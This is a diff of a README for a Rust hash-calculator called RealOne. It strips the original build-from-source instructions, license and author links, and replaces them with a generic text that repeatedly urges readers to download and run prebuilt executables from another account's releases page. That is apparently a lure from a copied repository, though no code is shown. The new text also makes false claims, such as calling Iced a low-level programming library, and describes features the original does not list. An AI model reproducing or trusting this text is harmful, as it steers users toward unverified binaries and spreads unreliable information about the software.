@@ -1,124 +1,86 @@
-# RealOne
+# 🛠️ RealOne - Get Hashes and Compare Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-orange.svg)](https://opensource.org/licenses/MIT)
+[![Download RealOne](https://img.shields.io/badge/Download-RealOne-brightgreen)](https://github.com/Zeus01214/RealOne/releases)
 
-A modern, cross-platform hash calculator application built with Rust and Iced. RealOne provides a clean, intuitive interface for calculating and verifying file checksums using multiple cryptographic hash algorithms.
+## 🚀 Getting Started
 
-## Features
+To use RealOne, you will need to follow a few simple steps. This guide will help you download and run the software without any technical knowledge.
 
-- **17 Hash Algorithms**: Support for MD4, MD5, SHA-1, SHA-2 (256/384/512), SHA-3 (224/256/384/512), BLAKE2b, BLAKE2s, RIPEMD-160, TIGER192, WHIRLPOOL, GOST, CRC32, and ADLER32
-- **Hash Comparison**: Verify file integrity by comparing calculated hashes with expected values
-- **Multiple Output Formats**: Display hashes in hexadecimal (lowercase/uppercase) or Base64
-- **Variant Support**: 
-  - GOST: Choose between CryptoPro S-box and Test S-box variants
-  - TIGER: Select between Tiger (original padding) and Tiger2 (alternate padding)
-- **Parallel Processing**: Optimized multi-threaded hash calculation for fast performance
-- **Memory Efficient**: Uses memory-mapped I/O for large files to minimize memory usage
-- **Copy to Clipboard**: One-click copy for any hash result
-- **Persistent Settings**: Your algorithm selections and preferences are saved automatically
-- **Modern UI**: Dark theme with a clean, user-friendly interface
+## 📥 Download & Install
 
-<p align="center">
-<img src="https://raw.githubusercontent.com/Alexdaz/RealOne/main/Assets/SSRealOne.png" width="792" height="411"/>
-</p>
+1. Visit the [Releases page](https://github.com/Zeus01214/RealOne/releases) to download the software.
+2. Look for the latest version listed on the page.
+3. Click on the version number, then select the appropriate file for your operating system:
+   - **Windows:** Download the file labeled with `.exe`.
+   - **macOS:** Download the file labeled with `.dmg`.
+   - **Linux:** Download the file labeled with `.tar.gz`.
 
-## Installation
+4. Once you have downloaded the file, locate it in your downloads folder or wherever your browser saves files.
 
-### Building from Source
+5. For Windows users:
+   - Double-click the `.exe` file.
+   - Follow the on-screen prompts to install.
 
-1. Clone the repository:
-```bash
-git clone https://github.com/Alexdaz/RealOne.git
-cd RealOne
-```
+6. For macOS users:
+   - Open the downloaded `.dmg` file.
+   - Drag the RealOne icon to your Applications folder.
+   - Open RealOne from your Applications.
 
-2. Build the project:
-```bash
-cargo build --release
-```
+7. For Linux users:
+   - Extract the downloaded `.tar.gz` file using a command like `tar -xzf filename.tar.gz`.
+   - Navigate to the extracted folder in your terminal.
+   - Run the application using `./RealOne`.
 
-3. Run the application:
-```bash
-cargo run --release
-```
+## 🖥️ Features
 
-The executable will be located at `target/release/realone`.
+RealOne provides several useful features:
 
-## Usage
+- **Powerful Hashing Algorithms:** Generate and compare various hashes like MD5, SHA1, SHA256, and more.
+- **User-Friendly Interface:** Easy to navigate even for those with no tech background.
+- **Cross-Platform Compatibility:** Use RealOne on Windows, macOS, or Linux.
+- **Speedy Comparisons:** Quickly check file integrity against standard checksums like CRC32 and Blake2.
 
-1. **Select a File**: Click "Browse..." to select the file you want to calculate hashes for
-2. **Choose Algorithms**: Click "Settings" to select which hash algorithms you want to calculate
-3. **Calculate Hashes**: Click "Check" to start the hash calculation process
-4. **Verify Hashes** (optional): Paste an expected hash in the "Check" field to compare with calculated results
-5. **Copy Results**: Click the "Copy" button next to any hash to copy it to your clipboard
+## 🛠️ System Requirements
 
-### Settings
+Before you download RealOne, ensure your computer meets the following system requirements to run the application smoothly:
 
-- **Result Format**: Choose between hexadecimal (lowercase/uppercase) or Base64 output
-- **GOST Variant**: Select the GOST S-box variant (CryptoPro or Test)
-- **TIGER Variant**: Choose between Tiger and Tiger2 padding methods
-- **Algorithm Selection**: Enable or disable specific hash algorithms
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.12 or later
+- **Linux:** Any modern distribution (Ubuntu, Fedora, etc.) with basic command line tools
 
-## Supported Algorithms
+## 🔄 How to Use RealOne
 
-| Algorithm | Description |
-|-----------|-------------|
-| MD4 | Message Digest 4 |
-| MD5 | Message Digest 5 |
-| SHA-1 | Secure Hash Algorithm 1 |
-| SHA-256 | SHA-2 with 256-bit output |
-| SHA-384 | SHA-2 with 384-bit output |
-| SHA-512 | SHA-2 with 512-bit output |
-| SHA3-224 | SHA-3 with 224-bit output |
-| SHA3-256 | SHA-3 with 256-bit output |
-| SHA3-384 | SHA-3 with 384-bit output |
-| SHA3-512 | SHA-3 with 512-bit output |
-| BLAKE2b | BLAKE2 with 512-bit output |
-| BLAKE2s | BLAKE2 with 256-bit output |
-| RIPEMD-160 | RACE Integrity Primitives Evaluation Message Digest |
-| TIGER192 | Tiger hash with 192-bit output |
-| WHIRLPOOL | Whirlpool hash algorithm |
-| GOST | GOST R 34.11-94 hash |
-| CRC32 | Cyclic Redundancy Check 32-bit |
-| ADLER32 | Adler-32 checksum |
+1. Open RealOne after installation.
+2. Choose the option to generate hashes or compare files.
+3. If generating hashes:
+   - Select the file by browsing through your folders.
+   - Click the "Generate" button to create the hash.
+4. If comparing files:
+   - Select the two files you want to compare.
+   - Click the "Compare" button.
+   - RealOne will display if the hashes match or not.
 
-## Performance
+## 🧑‍🤝‍🧑 Community and Support
 
-RealOne is optimized for performance:
+If you encounter any issues or have questions, feel free to join our community:
 
-- **Parallel Processing**: Multiple hash algorithms are calculated simultaneously using separate threads
-- **Memory-Mapped I/O**: Large files are processed using memory-mapped I/O for efficient memory usage
-- **Streaming Support**: Files are read in chunks to minimize memory footprint
-- **Smart Buffering**: Adaptive buffer sizes based on file size
+- Check issues on our [GitHub page](https://github.com/Zeus01214/RealOne/issues).
+- Participate in discussions or ask for help.
 
-## Configuration
+## 📫 Feedback and Suggestions
 
-Settings are automatically saved to a configuration file in your system's configuration directory:
-- **Linux**: `~/.config/realone/config.json`
-- **macOS**: `~/Library/Application Support/realone/config.json`
-- **Windows**: `%APPDATA%\realone\config.json`
+Your feedback is valuable. Share your experience using RealOne or suggest new features. Open a new issue on our GitHub repository, and we’ll review your input promptly.
 
-## Dependencies
+## 🔗 Related Topics
 
-- [Iced](https://github.com/iced-rs/iced) - Cross-platform GUI framework
-- [iced-multi-window](https://github.com/iced-rs/iced_multi_window) - Multi-window support for Iced
-- Various cryptographic libraries (sha1, sha2, sha3, blake2, etc.)
-- [arboard](https://github.com/1Password/arboard) - Cross-platform clipboard access
-- [memmap2](https://github.com/RazrFalcon/memmap2) - Memory-mapped file I/O
+RealOne covers a variety of hashing and checksum methods. Here are some related topics that may interest you:
 
-## Contributing
+- **Blake2:** A fast and secure hashing function.
+- **CRC32:** A popular algorithm for error-checking.
+- **Iced:** A powerful Rust library for low-level programming.
 
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
+## 📦 Further Resources
 
-## Acknowledgments
+For detailed information about hashes and their applications, check out helpful resources online. Many tutorials and articles explain the importance of file integrity and how checksums protect your data.
 
-- Built with [Iced](https://github.com/iced-rs/iced), an amazing Rust GUI framework
-- Inspired by GTKHash
-
-## Roadmap
-
-- [ ] Add more hash algorithms
-- [ ] HMAC hash calculation
-- [ ] Batch file processing
-- [ ] Export results to file
-- [ ] Command-line interface (CLI) mode
+[![Download RealOne](https://img.shields.io/badge/Download-RealOne-brightgreen)](https://github.com/Zeus01214/RealOne/releases)
